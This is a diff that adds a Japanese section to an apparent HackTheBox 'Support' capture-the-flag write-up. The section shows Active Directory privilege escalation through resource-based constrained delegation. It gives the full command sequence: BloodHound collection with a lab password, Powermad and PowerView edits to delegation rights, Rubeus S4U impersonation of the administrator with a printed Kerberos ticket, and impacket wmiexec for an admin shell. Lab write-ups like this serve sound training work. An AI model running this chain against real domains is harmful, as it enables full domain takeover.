@@ -120,6 +120,152 @@ objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
 
 ![usertxt](https://user-images.githubusercontent.com/85237728/194680079-a0d7880f-ce8b-407e-8baf-f57a8367a305.png)
 
+# Adminへの権限昇格
+
+bloodhoundを使う。
+
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -ns 10.10.11.174 -d support.htb -c all
+```
+
+すると、ユーザsupportが属しているShared Support Accountsグループは、dc.suuport.htbに対してGenericAllであることがわかる。
+
+![alltodc](https://user-images.githubusercontent.com/85237728/194802089-b88b0c47-fef3-42cd-9661-a8e3b53be653.png)
+
+## Kerberos Resource-based Constrained Delegation
+
+![atkexp](https://user-images.githubusercontent.com/85237728/194802186-faf7b816-6b59-4335-822d-820c9a2d26ab.png)
+
+
+bloodhoundのヘルプにしたがってコマンドを実行する。
+
+```powershell
+*Evil-WinRM* PS C:\Users\support> . .\Powermad.ps1
+*Evil-WinRM* PS C:\Users\support> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
+[+] Machine account attackersystem added
+
+*Evil-WinRM* PS C:\Users\support> . .\PowerView.ps1
+*Evil-WinRM* PS C:\Users\support> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
+
+*Evil-WinRM* PS C:\Users\support> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+*Evil-WinRM* PS C:\Users\support> $SDBytes = New-Object byte[] ($SD.BinaryLength)
+*Evil-WinRM* PS C:\Users\support> $SD.GetBinaryForm($SDBytes, 0)
+
+*Evil-WinRM* PS C:\Users\support> Get-DomainComputer dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+*Evil-WinRM* PS C:\Users\support> .\Rubeus.exe hash /password:Summer2018!
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.1.2
+
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : Summer2018!
+[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F
+
+Evil-WinRM* PS C:\Users\support> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:
+cifs/dc.support.htb /ptt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+...
+[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
+[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
+[*] Using domain controller: dc.support.htb (::1)
+[*] Sending S4U2proxy request to domain controller ::1:88
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':
+
+      doIGcDCCBmygAwIBBaEDAgEWooIFgjCCBX5hggV6MIIFdqADAgEFoQ0bC1NVUFBPUlQuSFRCoiEwH6AD
+      AgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGKjggU7MIIFN6ADAgESoQMCAQWiggUpBIIFJYISiJR8
+      QIH2oDUYkAjdeFdOxY/3nG+Ly+D7Q115aXxJHu5uwyfkjhbQAAhQsxEOQE7ij1v+kGWyNlYKDycQKj0N
+      Atzg4VLHqQHTlP8kwkkfgtYz4S+2gbFAC2yxcczzELqCzrDPEoH1uMH4N3YtDtNZOXUNKJ+BFlaJ6LMa
+      scQA4CQTvTrmR4ZZXbrO1Dq2CQi0CjbzKx0FJsmiHqDvymnfqjrYhl1n/KJ+K7vxell4P7ygkK/tULCp
+      61HrgJ9Ye2GGwdeG+In5gjBPT7RQNO9+7Pv0EKSG14llfEs7H8iwEJJmUL5+qlgeQD1jSnWnNx1yGOiW
+      xIVUtbFcRmG2u3DqZGA8lUpf4pmgjoDHQLeyGPG8EJJ8C7NUEeh3LKa3ahJvv+qOCNstZT3Oswe127RT
+      SIyZlXSoNoTlWV4ipq+FJbUEsj/tXeEHu/lJYofiTmNOvNvRjSXjfOvfCIk4sUrW2KXWQuN534WodQAT
+      kVXuwggzL5+uemHfjlROxM8X/gR0JgP4p7xd5T4OM8tmxiHRXnl1WHu/AER0ZGqElGD85jv1HHo7yDQa
+      NVPR9w5r4UrlZfzT0O3v7bayA4hj+WlcQYGQq8WeSbavcI5IvyV+A53S9lpznzZ2qopobEEZmFNRtkmz
+      qx9XZrY5napV2/EdXuKIy5ix3CD76FeGOCO3GR5xKW3Nu4shX+77cOwYA/9AGr0HZFCyaG3sTPnSE4U2
+      5j4pTF8U0+GEt5FiZaTVMPtsinxpnbNQlJLBlu48pBKRDKXk1+mOnF3oAaZbsRCkczggcVwYacPZ2IDy
+      aIh87S/lCKuxgXVzxv6Or9oa7/RKyIZyji4CM4zf8M0RTZKFhMuKQXuLDC1c9iX8ZFUIUd5ZcVHOsglL
+      Lx83+QH0UAfcfETlpxcqw9OPrS3Fh7MjRw61dJ8VjmxH6Qf2T+fZDsVqspYqoPBaALcMu3MyJqDtG4JB
+      7u73BqKijvHijnFiq3SxnpA6dTA2Fs2Rwddp+1bG992J3QFJRHBauJAOZ6CQhqy4j6HcwUxyDd9W4qkH
+      rRlSao/cN2aNIDtrj8nm21N4x/21xW4aSObZ+Stfw0LXnGTvYZ9KjgJci0FAqMt2LoGRkKx7cRIqKSvW
+      jp8ODU8JJzsq/eEF9gxYmp5nic8EMgPBps1e6hxVJNPIXmrddpjYe17DABN5tqGdWDfTHCIL0ZNprJo3
+      1CpvvPQqfvhjLtxB5jWZ7Ft7etboEbwNZovpB4kVyCFk78HFSq0kFzAuGf3TgrULrjD89h9QxWy1B9S2
+      ax+Jnv/9QfUjH7mAG5RKHSYm6Smc/AUNwBVVMs+e7KjHqnkroRQnqzqhXtuxEbRHOb/e5Qg9kAu++Khs
+      vHIrcJqLnqsjCnJh2lbjgucygxeziGIAIDDKTqFmtGDALNEtoF6lHgkVTtUEx3PyBQFaYTfoTeZcq8Aj
+      dvSTTJSyKbVTBPk/z/kBISXuUJwKCHTPaf7GeYaEVQDHcAp9jktCQCBMmCn++C+xj+q34QwjWe4NdYC6
+      wAtchjuqYTVvMw8/HpP8oRWYe/tv5bgcGZ7v/MOZqi1TOH18d1SZLT+CwCPaELYzegTL/Xf4wAgm+vYU
+      gjUuQ76ZpspTyXnGLrnbesWW1netPmseG5AkrKNwEu4Z4AprzG9ediuPnPa1ZmE+SmaR9doXXFnO1ZEc
+      jAiingc9W8QNMc2TL2ywTwRb8yP/5sNp2VCCVpfd7lxxejdcYDwd7WEYy4ILjkMrw2Q8AaOB2TCB1qAD
+      AgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oBswGaADAgERoRIEEKOMayFaldR5GNuP3yb+9jWhDRsLU1VQ
+      UE9SVC5IVEKiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJhdG9yowcDBQBApQAApREYDzIwMjIxMDEwMDI1
+      MjQ4WqYRGA8yMDIyMTAxMDEyNTI0OFqnERgPMjAyMjEwMTcwMjUyNDhaqA0bC1NVUFBPUlQuSFRCqSEw
+      H6ADAgECoRgwFhsEY2lmcxsOZGMuc3VwcG9ydC5odGI=
+[+] Ticket successfully imported!
+
+*Evil-WinRM* PS C:\Users\support> klist
+
+Current LogonId is 0:0xc2535
+
+Cached Tickets: (1)
+
+#0>	Client: administrator @ SUPPORT.HTB
+	Server: cifs/dc.support.htb @ SUPPORT.HTB
+	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+	Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
+	Start Time: 10/9/2022 19:52:48 (local)
+	End Time:   10/10/2022 5:52:48 (local)
+	Renew Time: 10/16/2022 19:52:48 (local)
+	Session Key Type: AES-128-CTS-HMAC-SHA1-96
+	Cache Flags: 0
+	Kdc Called:
+```
+
+得られたbase64表示のチケットをKali上にコピーする。その後、base64をデコードしてadmin.kirbiというファイル名で保存する。
+
+admin.kirbiをccacheファイルへ変換する。
+
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ impacket-ticketConverter admin.kirbi admin.ccache
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] converting kirbi to ccache...
+[+] done
+```
+環境変数`KRB5CCNAME`に設定する。
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ export KRB5CCNAME=admin.ccache 
+ ```
+ 最後に、impacketの`wmiexec`にて上で設定したチケットを使ってケルベロス認証すればAdminのシェルを得る。
+ 
+ ```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ impacket-wmiexec -k -no-pass support.htb/administrator@dc.support.htb
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+support\administrator
+```
+
 # 感想
 
 やはり`ldapsearch`コマンドのenumが大切。ローカルの`bloodhound`や`ldapdomaindump`ではsupportのパスワードは得られなかった。
